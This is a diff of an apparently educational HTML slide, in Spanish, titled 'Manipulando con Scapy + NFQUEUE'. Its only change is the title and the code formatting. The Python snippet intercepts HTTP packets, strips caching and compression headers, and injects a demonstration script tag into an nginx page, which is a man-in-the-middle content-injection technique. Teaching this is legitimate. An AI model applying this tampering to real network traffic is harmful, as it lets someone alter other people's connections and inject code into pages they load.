@@ -4,7 +4,7 @@
 
 <head>
 	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
-	<title>Modificación con Scapy + NFQUEUE</title>
+	<title>Manipulando con Scapy + NFQUEUE</title>
   <link rel="stylesheet" href="styles.css">
 
 <style>
@@ -76,30 +76,31 @@ footer {
 	<section style="height: 80%">
 	
 		<article>
-            <h1>Modificación con Scapy + NFQUEUE</h1>
-<div class="codehilite"><pre><span></span><span class="n">pkt</span> <span class="o">=</span> <span class="n">IP</span><span class="p">(</span><span class="n">packet</span><span class="o">.</span><span class="n">payload</span><span class="p">)</span>
+            <h1>Manipulando con Scapy + NFQUEUE</h1>
+<pre><code>:::py3
+pkt = IP(packet.payload)
 
-<span class="k">if</span> <span class="n">Raw</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">pkt</span> <span class="ow">or</span> <span class="n">TCP</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">pkt</span><span class="p">:</span>
-    <span class="n">packet</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>
-    <span class="k">continue</span>
+if Raw not in pkt or TCP not in pkt:
+    packet.accept()
+    continue
 
-<span class="k">del</span> <span class="n">pkt</span><span class="p">[</span><span class="n">IP</span><span class="p">]</span><span class="o">.</span><span class="n">len</span>
-<span class="k">del</span> <span class="n">pkt</span><span class="p">[</span><span class="n">IP</span><span class="p">]</span><span class="o">.</span><span class="n">chksum</span>
-<span class="k">del</span> <span class="n">pkt</span><span class="p">[</span><span class="n">TCP</span><span class="p">]</span><span class="o">.</span><span class="n">chksum</span>
+del pkt[IP].len
+del pkt[IP].chksum
+del pkt[TCP].chksum
 
-<span class="n">search_for</span>  <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;the nginx web server is successf&#39;</span>
-<span class="n">replace_for</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&lt;script&gt;alert(&quot;hacked&quot;)&lt;/script&gt;&#39;</span>
+search_for  = b'the nginx web server is successf'
+replace_for = b'&lt;script&gt;alert("hacked")&lt;/script&gt;'
 
-<span class="n">pkt</span><span class="p">[</span><span class="n">Raw</span><span class="p">]</span><span class="o">.</span><span class="n">load</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;If-Modified-Since.*\r\n&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="n">pkt</span><span class="p">[</span><span class="n">Raw</span><span class="p">]</span><span class="o">.</span><span class="n">load</span><span class="p">)</span>
-<span class="n">pkt</span><span class="p">[</span><span class="n">Raw</span><span class="p">]</span><span class="o">.</span><span class="n">load</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;If-None-Match.*\r\n&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="n">pkt</span><span class="p">[</span><span class="n">Raw</span><span class="p">]</span><span class="o">.</span><span class="n">load</span><span class="p">)</span>
-<span class="n">pkt</span><span class="p">[</span><span class="n">Raw</span><span class="p">]</span><span class="o">.</span><span class="n">load</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;Accept-Encoding.*\r\n&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="n">pkt</span><span class="p">[</span><span class="n">Raw</span><span class="p">]</span><span class="o">.</span><span class="n">load</span><span class="p">)</span>
-<span class="n">pkt</span><span class="p">[</span><span class="n">Raw</span><span class="p">]</span><span class="o">.</span><span class="n">load</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;Connection:.*\r\n&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="sa">b</span><span class="s1">&#39;Connection: close</span><span class="se">\r\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">pkt</span><span class="p">[</span><span class="n">Raw</span><span class="p">]</span><span class="o">.</span><span class="n">load</span><span class="p">)</span>
-<span class="n">pkt</span><span class="p">[</span><span class="n">Raw</span><span class="p">]</span><span class="o">.</span><span class="n">load</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;Upgrade-Insecure-Requests.*\r\n&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="n">pkt</span><span class="p">[</span><span class="n">Raw</span><span class="p">]</span><span class="o">.</span><span class="n">load</span><span class="p">)</span>
-<span class="n">pkt</span><span class="p">[</span><span class="n">Raw</span><span class="p">]</span><span class="o">.</span><span class="n">load</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="n">search_for</span><span class="p">,</span> <span class="n">replace_for</span><span class="p">,</span> <span class="n">pkt</span><span class="p">[</span><span class="n">Raw</span><span class="p">]</span><span class="o">.</span><span class="n">load</span><span class="p">)</span>
+pkt[Raw].load = re.sub(r'If-Modified-Since.*\r\n'.encode(), b'', pkt[Raw].load)
+pkt[Raw].load = re.sub(r'If-None-Match.*\r\n'.encode(), b'', pkt[Raw].load)
+pkt[Raw].load = re.sub(r'Accept-Encoding.*\r\n'.encode(), b'', pkt[Raw].load)
+pkt[Raw].load = re.sub(r'Connection:.*\r\n'.encode(), b'Connection: close\r\n', pkt[Raw].load)
+pkt[Raw].load = re.sub(r'Upgrade-Insecure-Requests.*\r\n'.encode(), b'', pkt[Raw].load)
+pkt[Raw].load = re.sub(search_for, replace_for, pkt[Raw].load)
 
-<span class="n">packet</span><span class="o">.</span><span class="n">payload</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">pkt</span><span class="p">)</span>
-<span class="n">packet</span><span class="o">.</span><span class="n">mangle</span><span class="p">()</span>
-</pre></div>
+packet.payload = bytes(pkt)
+packet.mangle()
+</code></pre>
 		</article>
 
 	</section>
